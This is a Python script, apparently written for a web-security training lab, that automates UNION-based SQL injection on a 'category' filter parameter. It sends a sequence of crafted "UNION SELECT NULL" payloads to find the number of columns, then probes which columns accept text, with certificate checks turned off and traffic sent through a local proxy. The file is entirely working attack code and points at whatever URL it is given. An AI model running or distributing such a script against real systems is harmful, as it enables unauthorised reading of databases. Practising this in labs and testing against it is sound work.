import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8082', 'https':'http://127.0.0.1:8082'}

def noofcolumns(fullurl):
    #find no of columns
    payload = "'+UNION+SELECT"
    payload1 = "--"
    for i in range(1,10):
        if (i == 1):
            payload2 = payload + "+NULL"
        else:
            payload2 = payload2 + "," + "NULL"
        fullpayload = payload2 + payload1
        fullurlpayload = fullurl+fullpayload
        r = requests.get(fullurlpayload, verify=False, proxies=proxies)
        if r.status_code == 200:
            return i, payload2

def columnsarestr(fullurl):
    #find if columns are string
    i, payload = noofcolumns(fullurl)
    payloadstr = "'abc'"
    payload4 = "--"
    payload1, payload2 = payload[:len(payload)//2+3], payload[len(payload)//2+3:]
    list_p = payload2.replace(","," ").split()
    for j in range(0,i):
        list_p[j] = payloadstr
        payload3 = (", ").join(list_p)
        fullpayload = payload1 + payload3
        fullurlpayload = fullurl + fullpayload + payload4
        r = requests.get(fullurlpayload, verify=False, proxies=proxies)
        if(r.status_code == 500):
            list_p[j] = "NULL"
        else:
            print("Columns ",j+1, "is a string")





if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        uri = '/filter?category='
        fullurl = url + uri

    except IndexError:
        print("[-] Usage: python3 findingacolumncontainingtext.py <url>")
        print("[-] Example: python3 findingacolumncontainingtext.py https://example.com")

    columnsarestr(fullurl)
